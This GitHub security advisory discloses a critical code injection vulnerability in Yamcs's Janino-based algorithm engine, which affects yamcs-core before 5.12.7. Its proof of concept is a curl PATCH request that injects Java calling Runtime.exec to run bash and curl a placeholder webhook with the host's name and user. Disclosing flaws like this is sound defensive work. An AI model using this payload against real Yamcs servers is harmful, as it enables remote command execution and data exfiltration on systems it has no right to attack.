# [C] Yamcs Vulnerable to Server-Side Code Injection (RCE) via Janino Expression Engine in `JavaExprAlgorithmExecutionFactory`

## Summary
Severity: Critical
Advisory: GHSA-524g-x36v-9wm6
CVE: CVE-2026-44632
CWE: CWE-94
Ecosystem: Maven
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-05-27
Source: https://github.com/advisories/GHSA-524g-x36v-9wm6
Type: github-advisory

## Affected
- Maven: `org.yamcs:yamcs-core` — affected >=0 <5.12.7

## Details
### Summary
A Server-Side Code Injection vulnerability exists in the Yamcs algorithm evaluation engine (`org.yamcs.algorithms.JavaExprAlgorithmExecutionFactory`). The application dynamically compiles and evaluates user-controlled algorithm text without enforcing a secure sandbox. An authenticated user with the `ChangeMissionDatabase` privilege can exploit this to achieve Remote Code Execution (RCE) on the underlying host operating system via the Janino compiler.

### Proof of Concept (PoC)
The vulnerability can be exploited by overriding an existing algorithm's text via the REST API and injecting a malicious Java payload that executes OS commands.

**Prerequisites:**
1. A running Yamcs instance with an active processor (e.g., `instance=myproject`, `processor=realtime`).
2. An active authentication token for a user with the `SystemPrivilege.ChangeMissionDatabase` privilege.

**Steps to Reproduce:**

1. Send an authenticated HTTP `PATCH` request to the MDB override endpoint to inject the malicious Java code into an existing algorithm (e.g., `copySunsensor`). The payload uses `java.lang.Runtime` to execute a reverse shell or ping an external webhook.

```bash
curl -i -X PATCH \
  'http://<YAMCS-SERVER-IP>:8090/api/mdb/myproject/realtime/algorithms/myproject/copySunsensor' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: Bearer <YOUR_AUTH_TOKEN>' \
  -d '{
    "action": "SET",
    "algorithm": {
      "text": "try { java.lang.Runtime.getRuntime().exec(new String[]{\"bash\", \"-c\", \"curl https://<YOUR-WEBHOOK-URL>/$(hostname)_$(whoami)\"}); } catch (Exception e) {} out0.setFloatValue(1.0f);"
    }
  }'
```

2. Trigger the algorithm evaluation by sending telemetry data that the algorithm depends on (e.g., running the `simulator.py` script to generate sun sensor data).
3. The Yamcs server uses the Janino `SimpleCompiler` to compile the injected text into a Java class on the fly. Since no restrictive `ClassLoader` is applied, the payload is successfully compiled and executed.
4. Verify that the command executed successfully on the host machine by checking the incoming HTTP request on the provided webhook URL.

### Impact
This vulnerability allows a user with application-level configuration privileges to escalate their access to full System/OS control. This leads to arbitrary command execution, potential data exfiltration, and lateral movement within the network hosting the Yamcs server.

### Credits
Discovered & reported by Pablo Picurelli Ortiz (@superpegaso2703), cybersecurity student at Universidad Rey Juan Carlos.

## References
- https://github.com/yamcs/yamcs/security/advisories/GHSA-524g-x36v-9wm6
- https://github.com/yamcs/yamcs
